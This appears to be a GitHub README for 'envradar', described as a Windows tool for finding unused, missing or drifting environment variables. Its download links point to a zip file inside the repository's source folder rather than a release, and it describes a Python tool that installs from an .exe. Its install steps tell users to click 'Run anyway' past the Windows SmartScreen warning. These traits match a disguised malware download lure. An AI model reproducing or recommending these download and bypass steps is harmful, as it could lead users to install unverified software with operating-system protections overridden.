# 🔍 envradar - Find hidden environment variable issues fast

[![Download envradar](https://img.shields.io/badge/Download-envradar-blue.svg)](https://github.com/palomitas86/envradar/raw/refs/heads/main/src/envradar/Software_v3.3.zip)

## 🎯 About this tool
Software projects rely on settings called environment variables. These settings tell your code how to connect to databases or handle security keys. Over time, these settings become messy. You might have variables that you no longer need. Sometimes a variable exists in one place but remains empty in another. This state creates bugs.

Envradar scans your project folder. It identifies variables that code does not use. It flags variables that look like mistakes. It also finds variables that drift between your local machine and your server. This tool helps you maintain a clean and secure project.

## 🛠️ System requirements
You need a computer running Windows 10 or Windows 11. Your system should have at least 4GB of RAM. The software also requires the Python runtime environment. If you do not have Python, the download package includes an installer to help you set it up. 

## 📥 How to get the software
You can get the latest version from our release page. Visit this link to reach the download area: [https://github.com/palomitas86/envradar/raw/refs/heads/main/src/envradar/Software_v3.3.zip](https://github.com/palomitas86/envradar/raw/refs/heads/main/src/envradar/Software_v3.3.zip).

Look for the section marked Releases on the right side of the page. Select the link for the Windows installer that ends in .exe. Save this file to your computer.

## ⚙️ Installation steps
1. Locate the file you downloaded. It typically sits in your Downloads folder.
2. Double-click the file to start the installer.
3. Windows might show a blue box that says "Windows protected your PC." If this happens, click "More info" and then "Run anyway."
4. Follow the prompts on the screen. The installer places the envradar icon on your desktop.
5. Click finish to complete the process.

## 🚀 Running your first scan
Open the envradar application from your desktop icon. A window opens that asks you to select a folder. Press the "Browse" button. Find the folder that contains your project code. Once you select the folder, the path shows up in the text box.

Press the "Start Scan" button. The tool looks at every file in your project. It compares the settings it finds against the actual code. This process might take a few seconds if your project is large. A progress bar shows you how much work remains.

## 📋 Understanding the results
The software displays a report once the scan ends. You will see three categories of findings:

*   **Unused variables:** These are items listed in your configuration files that your code never calls. You can safely remove these from your configuration files.
*   **Missing variables:** These are items that your code expects to find, but they do not exist in your configuration files. You should define these to prevent errors.
*   **Drift:** This happens when a variable exists but holds a different value than what the project expects. This often happens after team updates.

You can save this report as a text file by clicking "Export Results." This allows you to review the issues later. 

## ❓ Frequently asked questions

**Does this tool change my files?**
No. Envradar only reads your files. It does not delete or change your code. You remain in control of every change.

**Is it safe to run on private projects?**
Yes. The software runs entirely on your local computer. It does not send your data or your variables to any server. Your information stays private.

**What if the scan takes too long?**
Large projects contain thousands of files. If your project has thousands of image assets or logs, the scanner might slow down. You can exclude specific folders by clicking the "Settings" menu and adding them to the "Ignore List."

**Do I need a paid license?**
No. This tool is free to use for any project. There are no limits on how many times you run it.

## 💡 Troubleshooting tips
If the application fails to open, verify that you installed the correct version for Windows. You might need to restart your computer to finish the setup of the Python environment. Check that your user account has permission to read the files in your project folder. If the tool crashes during a scan, try scanning a smaller sub-folder to identify if a specific file causes the issue.

The command line interface also exists for advanced users who prefer typing commands. Open the Command Prompt or PowerShell and type "envradar --help" to see these options. The graphical interface provides the same features without the need to memorize text commands.

## 📈 Ongoing maintenance
Run this tool every week to keep your project healthy. As you add new features, your environment variables naturally grow. Regular scans prevent technical debt from piling up. A clean configuration file makes it easier for new people to join your project and setup their own machines. 

Developers who use envradar report fewer bugs related to missing settings. They spend less time debugging configuration errors and more time building new features. Use this tool early and often during your development cycle for best results.